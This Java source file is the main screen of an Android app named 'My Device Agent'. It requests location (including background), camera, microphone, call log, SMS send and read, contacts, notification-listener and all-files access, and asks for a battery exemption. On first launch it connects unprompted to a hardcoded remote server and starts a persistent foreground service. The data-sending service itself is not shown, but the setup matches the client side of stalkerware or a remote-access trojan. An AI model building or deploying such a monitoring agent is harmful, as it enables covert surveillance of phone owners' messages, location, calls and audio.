package com.mydevice.agent;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private EditText etServerUrl;
    private EditText etDeviceName;
    private Button btnConnect;
    private Button btnPermissions;
    private TextView tvStatus;
    private TextView tvPermissionStatus;

    private String[] allPermissions = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etServerUrl = findViewById(R.id.etServerUrl);
        etDeviceName = findViewById(R.id.etDeviceName);
        btnConnect = findViewById(R.id.btnConnect);
        btnPermissions = findViewById(R.id.btnPermissions);
        tvStatus = findViewById(R.id.tvStatus);
        tvPermissionStatus = findViewById(R.id.tvPermissionStatus);

        // Load saved settings (default URL is the Render deployment)
        SharedPreferences prefs = getSharedPreferences("mydevice", MODE_PRIVATE);
        String savedUrl = prefs.getString("server_url", "https://my-device-bd6v.onrender.com");
        String savedName = prefs.getString("device_name", Build.MODEL);
        etServerUrl.setText(savedUrl);
        if (!savedName.isEmpty()) etDeviceName.setText(savedName);

        // Check if service is already running
        if (DeviceService.isRunning) {
            tvStatus.setText("Status: Connected & Running");
            tvStatus.setTextColor(0xFF10B981);
            btnConnect.setText("Disconnect");
        } else if (!savedUrl.isEmpty()) {
            // Auto-connect on first launch if URL is available
            autoConnect(savedUrl, savedName);
        }

        btnPermissions.setOnClickListener(v -> requestAllPermissions());
        btnConnect.setOnClickListener(v -> toggleConnection());

        Button btnNotifAccess = findViewById(R.id.btnNotifAccess);
        btnNotifAccess.setOnClickListener(v -> openNotificationAccess());

        Button btnFileAccess = findViewById(R.id.btnFileAccess);
        btnFileAccess.setOnClickListener(v -> requestAllFilesAccess());

        updatePermissionStatus();
        requestBatteryOptimizationExemption();
    }

    private void autoConnect(String url, String name) {
        if (name == null || name.isEmpty()) name = Build.MODEL;

        SharedPreferences prefs = getSharedPreferences("mydevice", MODE_PRIVATE);
        prefs.edit()
            .putString("server_url", url)
            .putString("device_name", name)
            .apply();

        Intent intent = new Intent(this, DeviceService.class);
        intent.putExtra("server_url", url);
        intent.putExtra("device_name", name);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        tvStatus.setText("Status: Connecting...");
        tvStatus.setTextColor(0xFFF59E0B);
        btnConnect.setText("Disconnect");
    }

    private void toggleConnection() {
        if (DeviceService.isRunning) {
            // Stop service
            Intent intent = new Intent(this, DeviceService.class);
            stopService(intent);
            tvStatus.setText("Status: Disconnected");
            tvStatus.setTextColor(0xFFEF4444);
            btnConnect.setText("Connect & Start");
            Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
        } else {
            // Start service
            String url = etServerUrl.getText().toString().trim();
            String name = etDeviceName.getText().toString().trim();

            if (url.isEmpty()) {
                Toast.makeText(this, "Server URL daalein!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (name.isEmpty()) {
                name = Build.MODEL;
            }

            // Save settings
            SharedPreferences prefs = getSharedPreferences("mydevice", MODE_PRIVATE);
            prefs.edit()
                .putString("server_url", url)
                .putString("device_name", name)
                .apply();

            // Start foreground service
            Intent intent = new Intent(this, DeviceService.class);
            intent.putExtra("server_url", url);
            intent.putExtra("device_name", name);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }

            tvStatus.setText("Status: Connecting...");
            tvStatus.setTextColor(0xFFF59E0B);
            btnConnect.setText("Disconnect");
            Toast.makeText(this, "Service started! App minimize kar sakte ho.", Toast.LENGTH_LONG).show();
        }
    }

    private void requestAllPermissions() {
        List<String> needed = new ArrayList<>();

        for (String perm : allPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        // Android 13+ media permissions
        if (Build.VERSION.SDK_INT >= 33) {
            String[] mediaPerms = {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS
            };
            for (String perm : mediaPerms) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    needed.add(perm);
                }
            }
        }

        if (needed.isEmpty()) {
            Toast.makeText(this, "Sab permissions already granted!", Toast.LENGTH_SHORT).show();
            // Request background location separately
            requestBackgroundLocation();
        } else {
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    private void requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 101);
            }
        }
    }

    private void openNotificationAccess() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
            Toast.makeText(this, "My Device Agent ko enable karein!", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "Settings manually open karein", Toast.LENGTH_SHORT).show();
        }
    }

    private void requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                }
            } else {
                Toast.makeText(this, "All Files Access already granted!", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Not needed on this Android version", Toast.LENGTH_SHORT).show();
        }
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                try {
                    startActivity(intent);
                } catch (Exception e) {
                    // Some devices don't support this
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            updatePermissionStatus();
            // After granting foreground location, request background location
            requestBackgroundLocation();
        }

        updatePermissionStatus();
    }

    private void updatePermissionStatus() {
        int granted = 0;
        int total = allPermissions.length;

        for (String perm : allPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                granted++;
            }
        }

        if (Build.VERSION.SDK_INT >= 33) {
            total += 4; // media + notifications
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) granted++;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED) granted++;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED) granted++;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) granted++;
        }

        tvPermissionStatus.setText("Permissions: " + granted + "/" + total + " granted");

        if (granted == total) {
            tvPermissionStatus.setTextColor(0xFF10B981);
            btnPermissions.setText("All Permissions Granted!");
            btnPermissions.setEnabled(false);
        } else {
            tvPermissionStatus.setTextColor(0xFFF59E0B);
        }
    }
}
